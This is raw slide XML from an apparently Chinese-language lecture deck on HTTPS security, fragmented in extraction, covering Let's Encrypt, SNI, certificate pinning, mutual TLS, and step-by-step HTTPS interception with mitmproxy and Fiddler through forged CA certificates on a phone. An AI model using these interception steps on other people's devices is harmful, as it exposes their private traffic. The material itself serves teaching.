            </a:r>
            <a:endParaRPr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其中一个被改的客户是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，一家帮助人们安全地在线进行各种交易的代理网站（讽刺的是，代理域名销售是其业务的重要组成部分）。从星期一晚上</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5:00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开始大约两个小时，</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的网站看起来完全不同：其首页被纯文本形式的粗略消息取代。</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通过查看</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escrow.com</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的域名系统（</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DNS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）记录，可以看到它们指向的是马来西亚的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Internet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地址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-111.90.149.49</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tooltip="View all posts in Let's Encrypt"/>
              </a:rPr>
              <a:t>Let's Encrypt</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lang="en-US" altLang="zh-CN" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://letsencrypt.org/</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作为一个公共且免费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的项目逐渐被广大用户传播和使用，是由</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Mozilla</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Cisco</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Akamai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IdenTrust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EFF</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等组织人员发起，主要的目的也是为了推进网站从</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向</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过度的进程，目前已经有越来越多的商家加入和赞助支持。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Let's Encrypt</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US"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免费</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5" tooltip="View all posts in Let's Encrypt免费SSL"/>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证书的出现，也会对传统提供付费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证书服务的商家有不小的打击。到目前为止，</a:t>
            </a:r>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tooltip="View all posts in Let's Encrypt"/>
              </a:rPr>
              <a:t>Let's Encrypt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获得</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IdenTrust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交叉签名，这就是说可以应用且支持包括</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FireFox</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Chrome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在内的主流浏览器的兼容和支持，虽然目前是公测阶段，但是也有不少的用户在自有网站项目中正式使用起来。</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虽然目前</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Let's Encrypt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免费</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SSL</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证书默认是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90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天有效期，但是我们也可以到期自动续约，不影响我们的尝试和使用。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u="sng" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>图来自</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1200" b="0" i="0" u="sng" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>https://docs.mitmproxy.org/stable/concepts-howmitmproxyworks/</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1200" b="0" i="0" u="sng"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先通过一个简单的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 Connect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请求来连接代理服务器；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代理服务器返回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，表明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Connect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管道建立完毕；</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3.Client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开始进行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TLS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连接，中间人通过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SNI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来获知需要连接的目标是谁；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中间人连接真正的服务器；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中间人开始根据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SNI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CA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自动签发假的服务端证书，并返回给用户，并进行握手；</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握手成功，客户端开始发送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请求；</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中间人开始做用户到真正服务器的流量互相转发（可劫持）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u="sng" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>图来自</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1200" b="0" i="0" u="sng" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>https://docs.mitmproxy.org/stable/concepts-howmitmproxyworks/</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1200" b="0" i="0" u="sng"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先通过一个简单的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 Connect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请求来连接代理服务器；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代理服务器返回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200</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，表明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Connect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管道建立完毕；</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3.Client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开始进行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TLS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连接，中间人通过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SNI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来获知需要连接的目标是谁；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4.</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中间人连接真正的服务器；</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中间人开始根据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SNI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CA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自动签发假的服务端证书，并返回给用户，并进行握手；</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6.</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握手成功，客户端开始发送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请求；</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7.</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中间人开始做用户到真正服务器的流量互相转发（可劫持）</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hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://www.telerik.com/download/fiddler</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1200" b="0" i="0" u="none" strike="noStrike"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是最常用的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捕获及分析工具，除了可以捕获不加密的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流量外，还可以分析</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流量。</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可以通过伪造</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CA</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证书来欺骗浏览器和服务器。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在浏览器面前</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伪装成一个</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服务器，而在真正的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服务器面前</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又装成浏览器，从而实现解密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数据包的目的。</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打开</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Fidder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，点击菜单栏中的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[Tools] –&gt; [Fiddler Options]</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点击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[Connections]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，设置代理端口是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8888</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 勾选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Allow remote computers to connect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 点击</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OK</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这时在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可以看到自己本机无线网卡的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了（要是没有的话，重启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，或者可以在</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cmd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中</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ipconfig</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找到自己的网卡</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在手机端连接</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PC</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wifi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，并且设置代理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与端口（代理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就是上图的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，端口是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的代理端口</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8888</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长按手机上的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Wi-Fi</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名称弹出下拉菜单，选择“修改网络”，选中“显示高级选项”，可以设置代理</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访问网页输入代理</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>和端口，下载</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Fiddler</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的证书，点击下图</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>FiddlerRoot</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> certificate</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>http://www.site-digger.com/html/articles/20160509/123.html</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>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假设</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所在主机的</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IP</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是</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192.168.199.128</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。在</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Android</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上打开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Web</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浏览器，访问</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http://192.168.199.128:8888</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，如右下图所示。</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pPr fontAlgn="base"/>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）点击“</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1200" b="0" i="0" kern="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>FiddlerRoot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 certificate”</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连接，输入一个证书名称（任意），点确定即可（若未设置解锁密码，需要先设置）。</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pPr fontAlgn="base"/>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3</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）确认一下证书是否安装成功：设置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安全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受信任的凭证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-&gt;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用户。看到”</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DO_NOT_TRUST“</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即说明安装成功。</a:t>
            </a:r>
            <a:endPar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如果打开浏览器碰到类似下面的报错，请打开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的证书解密模式（</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设置解密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的网络数据）</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如果打开浏览器碰到类似下面的报错，请打开</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的证书解密模式（</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Fiddler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设置解密</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的网络数据）</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安装完了证书，可以用手机访问应用，就可以看到截取到的数据包了。（下图选中是布卡漫画的数据包，下面还有</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QQ</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邮箱的）</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不需要设置代理，由路由器（当然也不止路由器），把流量设置到目标服务器上，目标服务器来进行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劫持。</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不需要设置代理，由路由器（当然也不止路由器），把流量设置到目标服务器上，目标服务器来进行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HTTPS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劫持。</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然大多数情况下，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>HTTPS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>可以理解为 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>TLS + HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>，但是仍然有一些细节需要注意。</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>SNI </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>是什么呢？简单来说，一个 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>HTTPS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>服务器可能存在多个域名（同学们可以回忆一下 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>Apache </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>虚拟主机的配置这项功能），当进行 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>TLS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>握手的时候，不同的网站对应的 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>TLS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>服务端配置不一样，如果不携带想要访问哪个域名，那么服务器或中间件确实不知道应该转发到具体的哪个虚拟站点上，直接导致了 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>TLS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>的混乱。为了解决这个问题，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:effectLst/>
              </a:rPr>
              <a:t>ClientHello</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>中的 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>SNI </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>在 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>TLSv1.2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>开始支持，我们可以设置</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>Server Name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>这个字段，设置为网站域名。同样的，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>MITM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>也依赖 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:effectLst/>
              </a:rPr>
              <a:t>ServerName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>，因为 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:effectLst/>
              </a:rPr>
              <a:t>ServerName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>可能直接决定了中间人要连接的目标是啥，如果没有 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>SNI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>，中间人则没有办法寻找到连接目标，同样的也没有办法对网站进行临时签名了。</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疑问：</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HTTP </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的 </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1200" b="1" i="0" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Host </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不是有域名信息吗？为什么不能用？</a:t>
            </a:r>
            <a:endPar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dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>这个问题答案很简单 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>HTTPS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>中，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>TLS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>是 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>HTTP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>的前置条件，域名拿不到，没有办法进行 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>TLS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>签名，所以只能依赖 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:effectLst/>
              </a:rPr>
              <a:t>ClientHello</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>中的 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:effectLst/>
              </a:rPr>
              <a:t>ServerName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>了。</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这种场景一般用于移动端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APP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的防劫持，</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Twitter</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Google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系 </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APP </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很多都在使用这项技术，核心原理是把服务端证书或其他凭证内置在客户端，在客户端访问服务端的时候，会验证服务端证书有没有被替换。</a:t>
            </a:r>
            <a:endPar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dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>由于 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>SSL/TLS pining </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>强制验证服务端返回的证书中是否包含目标证书，如果我们可以弄到原本服务端证书，给他返回去是不是也可以绕过？理论上当然可以，但是这样，没有私钥的你也没有办法解密 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>TLS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>流量了。</a:t>
            </a:r>
            <a:r>
              <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rPr>
              <a:t>银弹？证书锁定带来的尴尬问题</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1200" b="1" i="0" kern="1200" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>如果仅仅只是塞一个证书锁定在客户端，那么客户端过期了的话，怎么办呢？那就只能强制用户更新客户端，这种 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>breaking </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>一般是不被允许的。如果塞一个公钥到客户端，如果证书、公钥被吊销，或者私钥被泄露的话，仍然是需要用户强制更新客户端。但是我相信任何处于业务快速膨胀期或者研发水平跟不上的 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>APP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>都不会这么操作的，一般有很硬后台，很高安全性要求，有成熟研发体系和 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>PKI </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>体系的公司可能才会有这种需求或能力做这件事情。</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诸如 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>WPA2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>企业级认证 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>EAP-TLS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>的认证方式，很多系统（如网银）都将 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>TLS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>的双向认证作为最高标准、最高安全等级的认证方式。同样的，对于 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>HTTP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>服务，同样也可以签署开启了 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>X509 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>双向认证的 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>TLS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>连接。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:effectLst/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>如果双向认证，中间人（代理）没有客户端的公钥证书，无法完成认证</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https://mp.weixin.qq.com/s/lRdVqBKlR708tGGXQxjUWA</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https://mp.weixin.qq.com/s/lRdVqBKlR708tGGXQxjUWA</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https://mp.weixin.qq.com/s/lRdVqBKlR708tGGXQxjUWA</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2" name="Group 2"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="2438400"/>
            <a:ext cx="9009063" cy="1052513"/>
            <a:chOff x="0" y="1536"/>
            <a:chExt cx="5675" cy="663"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="3" name="Group 3"/>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grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="4" name="Group 6"/>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en-US">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2"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endParaRPr lang="zh-CN" altLang="en-US"/>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4200"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:defRPr b="0" i="0" baseline="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr>
              <a:lnSpc>
                <a:spcPts val="4200"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:defRPr b="0" i="0" baseline="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr>
              <a:lnSpc>
                <a:spcPts val="4200"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:defRPr b="0" i="0" baseline="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr>
              <a:lnSpc>
                <a:spcPts val="4200"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:defRPr b="0" i="0" baseline="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr>
              <a:lnSpc>
                <a:spcPts val="4200"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:defRPr b="0" i="0" baseline="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>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标题 6"/>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13EAD5F1-67B5-4A0D-ABC1-AB8E7ABAD35E}"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65EB7420-10C5-4439-A879-6C64816B7E29}"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fld id="{8777064C-0A55-4E07-B965-6C3D3728ABB2}"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6B28E056-97FC-4A70-8131-E02F6583BF82}"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1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{E8AED8A2-82FC-4DC1-9863-2A50613A6AE6}" type="datetime1">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8"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p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{BBFD273C-C71A-40AC-9777-8B20B0D93BC7}"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11"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{075295FB-9049-4B10-8132-A2704FC040E4}" type="datetime1">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4"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p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{3782B63A-4FE1-4D96-8285-FCAE99EA7890}"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fld id="{27E94A6A-DBE8-4CE6-9619-41C62789DE7E}"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B733275C-2774-4B25-97E7-7065F970E90C}"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1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
